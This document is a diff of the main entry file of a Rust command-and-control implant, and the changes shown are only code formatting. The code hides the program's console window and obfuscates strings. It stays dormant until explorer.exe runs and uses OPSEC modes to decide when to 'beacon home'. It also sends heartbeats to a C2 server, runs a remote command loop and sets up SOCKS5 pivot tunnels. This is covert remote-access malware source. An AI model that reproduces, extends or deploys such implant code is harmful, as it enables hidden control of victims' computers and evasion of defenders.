@@ -1,4 +1,7 @@
-#![cfg_attr(all(target_os = "windows", not(debug_assertions)), windows_subsystem = "windows")]
+#![cfg_attr(
+    all(target_os = "windows", not(debug_assertions)),
+    windows_subsystem = "windows"
+)]
 
 // Use modules from the library crate 'agent'
 use agent::commands;
@@ -13,13 +16,13 @@ use agent::commands::command_shell::agent_loop;
 use agent::config::AgentConfig;
 use agent::networking::socks5_pivot::Socks5PivotHandler;
 use agent::networking::socks5_pivot_server::Socks5PivotServer;
-use agent::opsec::{AgentMode, determine_agent_mode};
+use agent::opsec::{determine_agent_mode, AgentMode};
 use agent::state::MEMORY_PROTECTOR;
 
-use std::time::Duration;
-use std::sync::Arc;
-use log::{info, warn, error};
+use log::{error, info, warn};
 use std::env;
+use std::sync::Arc;
+use std::time::Duration;
 
 // Helper function to get current timestamp
 fn now_timestamp() -> std::time::Instant {
@@ -31,16 +34,20 @@ fn now_timestamp() -> std::time::Instant {
 // It checks for the presence of explorer.exe and waits for up to 10 minutes
 #[cfg(target_os = "windows")]
 fn dormant_startup() {
-    use sysinfo::{System, RefreshKind};
-    use std::ffi::OsStr;
     use obfstr::obfstr;
+    use std::ffi::OsStr;
+    use sysinfo::{RefreshKind, System};
 
     let mut sys = System::new_with_specifics(RefreshKind::everything());
     let start = now_timestamp();
     // Wait up to 10 minutes or until explorer.exe is running
     while start.elapsed().as_secs() < 600 {
         sys.refresh_specifics(RefreshKind::everything());
-        if sys.processes_by_name(OsStr::new(obfstr!("explorer.exe"))).next().is_some() {
+        if sys
+            .processes_by_name(OsStr::new(obfstr!("explorer.exe")))
+            .next()
+            .is_some()
+        {
             break;
         }
         std::thread::sleep(std::time::Duration::from_secs(5));
@@ -60,7 +67,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Channel for pivot frames
     let (pivot_tx, mut pivot_rx) = tokio::sync::mpsc::channel(100);
-    let pivot_handler = Arc::new(tokio::sync::Mutex::new(agent::networking::socks5_pivot::Socks5PivotHandler::new(pivot_tx.clone())));
+    let pivot_handler = Arc::new(tokio::sync::Mutex::new(
+        agent::networking::socks5_pivot::Socks5PivotHandler::new(pivot_tx.clone()),
+    ));
 
     if config.socks5_enabled {
         info!("[CONFIG] SOCKS5 is enabled. Proxy: {}:{}, all C2 traffic will use SOCKS5 Proxy tunnel.", config.socks5_host, config.socks5_port);
@@ -90,7 +99,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let server_addr = env::args()
         .nth(1)
         .unwrap_or_else(|| config.get_server_url());
-    
+
     let agent_id = config.payload_id.clone();
     info!("[INFO] Agent ID: {}", agent_id);
 
@@ -107,13 +116,19 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             agent::opsec::AgentMode::ReducedActivity => {
                 info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");
 
-                if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
+                if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(
+                    &config,
+                    &server_addr,
+                    &agent_id,
+                )
+                .await
+                {
                     error!("[OPSEC] Heartbeat failed in ReducedActivity (initial loop): {}. C2 failure counter updated internally.", e);
                 } else {
                     info!("[OPSEC] Heartbeat successful in ReducedActivity (initial loop).");
                 }
-                
-                std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
+
+                std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs));
             }
             agent::opsec::AgentMode::FullOpsec => {
                 info!("[OPSEC] Not safe to beacon home. Staying in FullOpsec (encrypted and dormant).");
@@ -123,14 +138,24 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
     // --- End Initial Opsec Check Loop ---
 
-    // --- Main Agent Execution Loop --- 
-    loop {        
+    // --- Main Agent Execution Loop ---
+    loop {
         // agent_loop handles C2 comms and command execution
-        if let Err(e) = agent::commands::command_shell::agent_loop(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
-            error!("[ERROR] Agent loop error: {}. Preparing to re-assess OPSEC state.", e);
+        if let Err(e) = agent::commands::command_shell::agent_loop(
+            &server_addr,
+            &agent_id,
+            pivot_handler.clone(),
+            pivot_tx.clone(),
+        )
+        .await
+        {
+            error!(
+                "[ERROR] Agent loop error: {}. Preparing to re-assess OPSEC state.",
+                e
+            );
             // Don't immediately exit; re-assess below
         }
-        
+
         info!("[OPSEC] Returned from agent_loop or error occurred. Re-assessing OPSEC state...");
 
         // Re-assessment Loop (similar to initial check)
@@ -144,13 +169,21 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 agent::opsec::AgentMode::ReducedActivity => {
                     info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");
 
-                    if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
+                    if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(
+                        &config,
+                        &server_addr,
+                        &agent_id,
+                    )
+                    .await
+                    {
                         error!("[OPSEC] Heartbeat failed in ReducedActivity (re-assessment loop): {}. C2 failure counter updated internally.", e);
                     } else {
-                        info!("[OPSEC] Heartbeat successful in ReducedActivity (re-assessment loop).");
+                        info!(
+                            "[OPSEC] Heartbeat successful in ReducedActivity (re-assessment loop)."
+                        );
                     }
-                    
-                    std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
+
+                    std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs));
                 }
                 agent::opsec::AgentMode::FullOpsec => {
                     info!("[OPSEC] Not safe to beacon home. Staying in FullOpsec (encrypted and dormant).");
